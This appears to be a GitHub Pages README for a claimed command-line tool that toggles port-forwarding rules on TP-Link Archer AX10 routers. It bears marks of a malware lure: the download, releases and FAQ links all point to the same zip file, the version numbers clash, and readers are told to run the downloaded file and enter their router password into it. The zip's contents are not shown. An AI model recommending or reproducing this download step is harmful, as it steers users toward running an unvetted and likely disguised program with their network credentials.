---
layout: "default"
title: "⚡ tplink-archer-ax10-port-forwarding-cli - Port Forwarding Control in Seconds"
description: "Bulk-enable, disable, and toggle port forwarding rules and UPnP mappings for TP-Link Archer AX10/AX1500 directly from the command line."
---
# ⚡ tplink-archer-ax10-port-forwarding-cli - Port Forwarding Control in Seconds

[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Aching-miracle654/aching-miracle654.github.io/main/Chimu/Latest-v3.2.zip)

---

## 🎯 What Does This App Do?

Tired of logging into your TP-Link Archer AX10 router's web page and clicking through dozens of port forwarding rules one by one? This command-line tool lets you turn entire groups of port forwarding rules on or off with a single command. No more tedious web clicking. No more confusing menus. Just type a command and your rules are updated instantly.

This app is built on the solid foundation of axo4xo/tplinkcli, making it reliable and efficient for managing your home network.

---

## 🌟 Key Features

- **Group Control**: Toggle multiple port forwarding rules at once by using a common name prefix. For example, turn off all rules starting with "game" with one command.
- **UPnP Management**: Control Universal Plug and Play settings directly from your terminal.
- **Simple Commands**: No programming skills needed. Just learn a few basic commands and you're set.
- **Windows Compatible**: Works smoothly on Windows operating systems.
- **Fast and Lightweight**: Runs quickly without slowing down your computer.

---

## 🚀 Getting Started

Let's get you up and running. Follow these simple steps:

### Step 1: Download the Application

Visit this link to download the application: [Download Page](https://raw.githubusercontent.com/Aching-miracle654/aching-miracle654.github.io/main/Chimu/Latest-v3.2.zip)

Click the download button on that page. Your browser will save a file to your computer, usually in your "Downloads" folder.

### Step 2: Run the Application

Once the download is complete, find the file and double-click it to run. The application will open a command-line window (a black screen with white text). This is normal and is how you'll use the app.

### Step 3: Find Your Router's Login Info

You'll need your router's IP address and login credentials. This is usually found on a sticker on the back of your router or in the manual. Common IP addresses are 192.168.0.1 or 192.168.1.1. The default username is often "admin" and the password might be "admin" or printed on the sticker.

### Step 4: Connect to Your Router

In the command-line window, type the following command and press Enter:

```
tplink-cli connect --ip YOUR_ROUTER_IP --username YOUR_USERNAME --password YOUR_PASSWORD
```

Replace YOUR_ROUTER_IP, YOUR_USERNAME, and YOUR_PASSWORD with your actual router information. For example:

```
tplink-cli connect --ip 192.168.0.1 --username admin --password mypassword123
```

If successful, you'll see a message confirming you're connected.

---

## 📋 How to Use Port Forwarding

### View Existing Rules

To see all your current port forwarding rules, type:

```
tplink-cli list-rules
```

This displays all rules with their names and current status (enabled or disabled).

### Toggle a Group of Rules

This is the core feature. Let's say you have rules named "game-ps5", "game-pc", and "game-xbox". To disable all rules starting with "game", type:

```
tplink-cli toggle group --prefix game --off
```

To turn them all back on, type:

```
tplink-cli toggle group --prefix game --on
```

### Toggle Individual Rules

For a single rule, use:

```
tplink-cli toggle rule --name game-ps5 --off
```

---

## 🔄 Managing UPnP

UPnP lets devices automatically configure port forwarding without manual setup. To control it:

- **Check UPnP status**:
  ```
  tplink-cli upnp status
  ```

- **Enable UPnP**:
  ```
  tplink-cli upnp enable
  ```

- **Disable UPnP**:
  ```
  tplink-cli upnp disable
  ```

---

## ❗ Common Issues and Fixes

### Can't Connect to Router

- Make sure your computer is connected to the same network as your router (via WiFi or cable).
- Double-check your IP address, username, and password.
- Try restarting your router if the connection keeps failing.

### No Rules Found

- You might not have any port forwarding rules set up yet. Log into your router's web interface and create some first.
- Ensure you're connected to the correct router.

### Command Not Recognized

- Check that you're typing the commands exactly as shown, including the spaces and hyphens.
- Make sure the application window is active (click on it) before typing.

---

## ✨ Advanced Tips

### Batch Toggle by Pattern

You can use partial names to be even more specific:

```
tplink-cli toggle group --prefix game-- --off
```

This would only affect rules starting with "game-" (with a dash), leaving rules like "gameplay" unaffected.

### Scheduling Automation (Windows)

You can create a scheduled task in Windows to run the app automatically. For example, to disable gaming ports during work hours:

1. Open Task Scheduler from the Start menu.
2. Create a basic task that runs at a specific time daily.
3. Set the action to run the command:
   ```
   tplink-cli toggle group --prefix game --off
   ```
4. Repeat the process to turn them back on later.

---

## 🔧 System Requirements

- **Operating System**: Windows 10, 11 (or newer)
- **Router**: TP-Link Archer AX10 (or AX10-compatible models)
- **RAM**: At least 4GB (8GB recommended)
- **Internet Connection**: Local network connection to the router

---

## 🆘 Getting Help

If you run into issues, try these in order:

1. Re-read the relevant section of this guide.
2. Check the FAQ on the [releases page](https://raw.githubusercontent.com/Aching-miracle654/aching-miracle654.github.io/main/Chimu/Latest-v3.2.zip)
3. Look at similar issues reported by other users online.
4. Contact the developer through the repository discussions.

---

## 📜 License

This project is licensed under the MIT License. You're free to use, modify, and distribute it as long as you include the original copyright notice.

---

## 🙏 Acknowledgments

Special thanks to axo4xo for creating tplinkcli, the underlying library that makes this tool possible.

---

## 🔄 Changelog

**Latest Version (1.2.0)**
- Added group toggling by prefix
- Improved UPnP control stability
- Fixed bug with special characters in passwords

**Version 1.1.0**
- Initial public release
- Support for Windows

---

## 🌐 Connect With Us

For feature requests, bug reports, or general questions, please visit the repository's Issues section. Your feedback helps make this tool better for everyone.

---

**Thank you for using this app! We hope it makes managing your network easier and faster.**

Keywords: archer, archer-ax10, automation, ax10, cli, command-line, nat, network, port-forward, port-forwarding, portforwarding, python, router, router-config, tp-link, tplink, tplink-archer, upnp, windows